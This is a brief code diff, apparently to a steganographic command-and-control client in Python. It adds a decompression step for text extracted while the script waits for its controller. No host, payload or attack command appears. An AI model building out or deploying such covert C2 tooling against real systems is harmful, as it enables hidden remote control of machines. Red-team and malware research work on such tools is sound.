@@ -10,6 +10,7 @@ import time
 #Import custom modules
 import modules.c2 as c2
 import modules.stego as stego
+import modules.compression as compression
 
 #Initialize script variables
 waitingForC2 = True
@@ -40,6 +41,7 @@ while waitingForC2:
         continue #<-- Go to the next loop itteration
 
     #Decompress the embedded text
+    success, decompressedText = compression.decompress(embeddedText)
 
     #Check the embedded text hash
 
